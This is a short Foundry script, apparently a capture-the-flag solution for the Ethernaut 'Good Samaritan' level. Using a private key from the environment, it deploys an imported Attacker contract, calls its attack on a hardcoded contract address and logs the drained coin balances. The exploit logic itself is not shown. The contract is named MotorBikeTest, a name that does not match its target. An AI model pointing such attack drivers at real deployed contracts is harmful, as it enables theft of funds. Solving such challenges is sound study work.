// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "../src/Attacker.sol";

contract MotorBikeTest is Test {
    address goodSamaritanAddress = 0x1E15774bAc3CbCd7f9EDfDA65a6A8cd52cFc73EE;
    

    function test() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address EOA = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
        Attacker attacker = new Attacker();
        attacker.attack(goodSamaritanAddress);
        GoodSamaritan goodSamaritan = GoodSamaritan(goodSamaritanAddress);
        Coin coin = Coin(goodSamaritan.coin());
        console2.log(coin.balances(address(attacker)));
        console2.log(coin.balances(goodSamaritanAddress));
        
        vm.stopBroadcast();
    }
}
